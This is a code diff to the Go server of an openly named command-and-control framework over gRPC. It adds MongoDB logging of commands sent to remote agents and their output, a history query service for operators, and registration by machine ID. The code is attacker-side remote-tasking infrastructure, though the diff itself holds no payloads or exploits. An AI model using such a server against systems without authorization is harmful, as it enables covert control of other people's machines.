@@ -2,15 +2,20 @@ package main
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
 	"io"
 	"log"
 	"net"
+	"strings"
 	"sync"
 	"time"
 
 	pb "github.com/ardhptr21/c2-grpc/pb"
 	"github.com/google/uuid"
+	"go.mongodb.org/mongo-driver/bson"
+	"go.mongodb.org/mongo-driver/mongo"
+	"go.mongodb.org/mongo-driver/mongo/options"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/codes"
 	"google.golang.org/grpc/status"
@@ -24,6 +29,24 @@ type Agent struct {
 	LastSeen time.Time
 }
 
+type TaskExecution struct {
+	TaskID      string    `bson:"task_id"`
+	AgentID     string    `bson:"agent_id"`
+	Command     string    `bson:"command"`
+	Args        string    `bson:"args"`
+	Output      string    `bson:"output"`
+	ExecutedAt  time.Time `bson:"executed_at"`
+	CompletedAt time.Time `bson:"completed_at"`
+}
+
+type TaskRecord struct {
+	TaskID     string
+	AgentID    string
+	Command    string
+	Args       string
+	ExecutedAt time.Time
+}
+
 var (
 	agentsMu sync.RWMutex
 	agents   = make(map[string]*Agent)
@@ -34,11 +57,17 @@ var (
 	outputsMu sync.Mutex
 	outputs   = make(map[string][]string)
 
+	taskRecordsMu sync.Mutex
+	taskRecords   = make(map[string]TaskRecord)
+
 	operatorsMu sync.Mutex
 	operators   = make(map[string]pb.OperatorService_ConnectServer)
 
 	agentStreamsMu sync.Mutex
 	agentStreams   = make(map[string]pb.TaskService_ReceiveTasksServer)
+
+	mongoClient       *mongo.Client
+	historyCollection *mongo.Collection
 )
 
 type agentServer struct {
@@ -61,6 +90,10 @@ type operatorServer struct {
 	pb.UnimplementedOperatorServiceServer
 }
 
+type historyServer struct {
+	pb.UnimplementedHistoryServiceServer
+}
+
 func shortUUID(n int) string {
 	return uuid.NewString()[:n]
 }
@@ -79,6 +112,22 @@ func removeAgent(agentID string) (string, bool) {
 	tasksMu.Lock()
 	delete(tasks, agentID)
 	tasksMu.Unlock()
+
+	var taskIDs []string
+	taskRecordsMu.Lock()
+	for taskID, record := range taskRecords {
+		if record.AgentID == agentID {
+			taskIDs = append(taskIDs, taskID)
+			delete(taskRecords, taskID)
+		}
+	}
+	taskRecordsMu.Unlock()
+
+	outputsMu.Lock()
+	for _, taskID := range taskIDs {
+		delete(outputs, taskID)
+	}
+	outputsMu.Unlock()
 
 	agentStreamsMu.Lock()
 	delete(agentStreams, agentID)
@@ -113,6 +162,103 @@ func broadcastToOperators(event *pb.OperatorEvent) {
 	}
 }
 
+func connectMongo(ctx context.Context) (*mongo.Client, *mongo.Collection, error) {
+	client, err := mongo.Connect(ctx, options.Client().ApplyURI("mongodb://localhost:27017"))
+	if err != nil {
+		return nil, nil, err
+	}
+
+	if err := client.Ping(ctx, nil); err != nil {
+		_ = client.Disconnect(context.Background())
+		return nil, nil, err
+	}
+
+	collection := client.Database("c2_grpc").Collection("command_history")
+	_, err = collection.Indexes().CreateOne(ctx, mongo.IndexModel{
+		Keys: bson.D{
+			{Key: "agent_id", Value: 1},
+			{Key: "executed_at", Value: -1},
+		},
+	})
+	if err != nil {
+		_ = client.Disconnect(context.Background())
+		return nil, nil, err
+	}
+
+	return client, collection, nil
+}
+
+func trackTask(agentID string, task pb.Task) {
+	taskRecordsMu.Lock()
+	taskRecords[task.GetTaskId()] = TaskRecord{
+		TaskID:     task.GetTaskId(),
+		AgentID:    agentID,
+		Command:    task.GetCommand(),
+		Args:       task.GetArgs(),
+		ExecutedAt: time.Now(),
+	}
+	taskRecordsMu.Unlock()
+}
+
+func persistTaskHistory(taskID string) {
+	taskRecordsMu.Lock()
+	record, ok := taskRecords[taskID]
+	if ok {
+		delete(taskRecords, taskID)
+	}
+	taskRecordsMu.Unlock()
+	if !ok {
+		return
+	}
+
+	outputsMu.Lock()
+	lines := append([]string(nil), outputs[taskID]...)
+	delete(outputs, taskID)
+	outputsMu.Unlock()
+
+	if historyCollection == nil {
+		return
+	}
+
+	doc := TaskExecution{
+		TaskID:      record.TaskID,
+		AgentID:     record.AgentID,
+		Command:     record.Command,
+		Args:        record.Args,
+		Output:      strings.Join(lines, ""),
+		ExecutedAt:  record.ExecutedAt,
+		CompletedAt: time.Now(),
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	if _, err := historyCollection.InsertOne(ctx, doc); err != nil {
+		log.Printf("[server] mongo insert error for task %s: %v", taskID, err)
+		return
+	}
+
+	entryPayload, err := json.Marshal(&pb.AgentHistoryEntry{
+		TaskId:      doc.TaskID,
+		AgentId:     doc.AgentID,
+		Command:     doc.Command,
+		Args:        doc.Args,
+		Output:      doc.Output,
+		ExecutedAt:  doc.ExecutedAt.UnixMilli(),
+		CompletedAt: doc.CompletedAt.UnixMilli(),
+	})
+	if err != nil {
+		log.Printf("[server] history payload encode error for task %s: %v", taskID, err)
+		return
+	}
+
+	broadcastToOperators(&pb.OperatorEvent{
+		Type:    "history_updated",
+		AgentId: record.AgentID,
+		Payload: string(entryPayload),
+	})
+}
+
 func startWatchdog() {
 	ticker := time.NewTicker(3 * time.Second)
 	defer ticker.Stop()
@@ -135,17 +281,19 @@ func startWatchdog() {
 }
 
 func (s *agentServer) Register(ctx context.Context, req *pb.RegisterRequest) (*pb.RegisterResponse, error) {
+	machineID := strings.TrimSpace(req.GetMachineId())
+	if machineID == "" {
+		return nil, status.Error(codes.InvalidArgument, "machine_id is required")
+	}
+
 	agentsMu.Lock()
 	defer agentsMu.Unlock()
 
-	for _, agent := range agents {
-		if agent.Hostname == req.GetHostname() {
-			return nil, status.Error(codes.AlreadyExists, "hostname already registered")
-		}
+	if _, exists := agents[machineID]; exists {
+		return nil, status.Error(codes.AlreadyExists, "agent already registered")
 	}
 
-	agentID := shortUUID(8)
-	agents[agentID] = &Agent{
+	agents[machineID] = &Agent{
 		Hostname: req.GetHostname(),
 		OS:       req.GetOs(),
 		IP:       req.GetIp(),
@@ -154,18 +302,20 @@ func (s *agentServer) Register(ctx context.Context, req *pb.RegisterRequest) (*p
 	}
 
 	tasksMu.Lock()
-	tasks[agentID] = []pb.Task{}
+	if _, exists := tasks[machineID]; !exists {
+		tasks[machineID] = []pb.Task{}
+	}
 	tasksMu.Unlock()
 
 	go broadcastToOperators(&pb.OperatorEvent{
 		Type:    "agent_joined",
-		AgentId: agentID,
+		AgentId: machineID,
 		Payload: fmt.Sprintf("%s @ %s", req.GetHostname(), req.GetIp()),
 	})
 
 	return &pb.RegisterResponse{
-		AgentId: agentID,
-		Message: fmt.Sprintf("Welcome, %s. Your ID is %s", req.GetHostname(), agentID),
+		AgentId: machineID,
+		Message: fmt.Sprintf("Welcome, %s. Your ID is %s", req.GetHostname(), machineID),
 	}, nil
 }
 
@@ -282,6 +432,9 @@ func (s *outputServer) SendOutput(stream pb.OutputService_SendOutputServer) erro
 	for {
 		chunk, err := stream.Recv()
 		if err == io.EOF {
+			if taskID != "" {
+				persistTaskHistory(taskID)
+			}
 			return stream.SendAndClose(&pb.OutputAck{
 				TaskId:  taskID,
 				Success: true,
@@ -374,6 +527,7 @@ func (s *operatorServer) Connect(stream pb.OperatorService_ConnectServer) error 
 				Command: cmd.GetCommand(),
 				Args:    cmd.GetArgs(),
 			}
+			trackTask(cmd.GetTargetAgentId(), task)
 			pushTaskToAgent(cmd.GetTargetAgentId(), task)
 
 			_ = stream.Send(&pb.OperatorEvent{
@@ -390,6 +544,54 @@ func (s *operatorServer) Connect(stream pb.OperatorService_ConnectServer) error 
 	case err := <-errCh:
 		return err
 	}
+}
+
+func (s *historyServer) ListAgentHistory(ctx context.Context, req *pb.AgentHistoryRequest) (*pb.AgentHistoryResponse, error) {
+	if historyCollection == nil {
+		return nil, status.Error(codes.FailedPrecondition, "history storage unavailable")
+	}
+	if req.GetAgentId() == "" {
+		return nil, status.Error(codes.InvalidArgument, "agent_id is required")
+	}
+
+	limit := req.GetLimit()
+	if limit <= 0 || limit > 200 {
+		limit = 50
+	}
+
+	queryCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
+	defer cancel()
+
+	cursor, err := historyCollection.Find(
+		queryCtx,
+		bson.M{"agent_id": req.GetAgentId()},
+		options.Find().SetSort(bson.D{{Key: "executed_at", Value: -1}}).SetLimit(int64(limit)),
+	)
+	if err != nil {
+		return nil, status.Error(codes.Internal, err.Error())
+	}
+	defer cursor.Close(queryCtx)
+
+	var docs []TaskExecution
+	if err := cursor.All(queryCtx, &docs); err != nil {
+		return nil, status.Error(codes.Internal, err.Error())
+	}
+
+	resp := &pb.AgentHistoryResponse{
+		Entries: make([]*pb.AgentHistoryEntry, 0, len(docs)),
+	}
+	for _, doc := range docs {
+		resp.Entries = append(resp.Entries, &pb.AgentHistoryEntry{
+			TaskId:      doc.TaskID,
+			AgentId:     doc.AgentID,
+			Command:     doc.Command,
+			Args:        doc.Args,
+			Output:      doc.Output,
+			ExecutedAt:  doc.ExecutedAt.UnixMilli(),
+			CompletedAt: doc.CompletedAt.UnixMilli(),
+		})
+	}
+	return resp, nil
 }
 
 func pushTaskToAgent(agentID string, task pb.Task) {
@@ -409,12 +611,27 @@ func pushTaskToAgent(agentID string, task pb.Task) {
 }
 
 func main() {
+	mongoCtx, cancelMongo := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancelMongo()
+
+	var err error
+	mongoClient, historyCollection, err = connectMongo(mongoCtx)
+	if err != nil {
+		log.Fatalf("mongo connect error: %v", err)
+	}
+	defer func() {
+		disconnectCtx, cancelDisconnect := context.WithTimeout(context.Background(), 5*time.Second)
+		defer cancelDisconnect()
+		_ = mongoClient.Disconnect(disconnectCtx)
+	}()
+
 	lis, err := net.Listen("tcp", ":50051")
 	if err != nil {
 		log.Fatalf("listen error: %v", err)
 	}
 
 	log.Printf("[server] c2-grpc server running on %s", lis.Addr().String())
+	log.Printf("[server] mongodb connected on localhost:27017")
 
 	s := grpc.NewServer()
 	pb.RegisterAgentServiceServer(s, &agentServer{})
@@ -422,6 +639,7 @@ func main() {
 	pb.RegisterTaskServiceServer(s, &taskServer{})
 	pb.RegisterOutputServiceServer(s, &outputServer{})
 	pb.RegisterOperatorServiceServer(s, &operatorServer{})
+	pb.RegisterHistoryServiceServer(s, &historyServer{})
 
 	go startWatchdog()
 
